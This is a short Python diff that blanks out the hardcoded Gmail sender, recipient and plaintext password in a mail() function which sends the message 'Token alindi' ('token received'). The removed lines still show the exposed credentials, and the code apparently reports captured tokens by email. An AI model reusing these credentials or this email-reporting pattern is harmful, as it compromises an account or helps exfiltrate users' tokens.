@@ -141,9 +141,9 @@ def listen():
 
    
 def mail():
-    sender="alqeren0@gmail.com"
-    rec="alqeren1@gmail.com"
-    password="aaydin1213"
+    sender=""
+    rec=""
+    password=""
     message="Token alindi"
 
     server = smtplib.SMTP('smtp.gmail.com', 587)
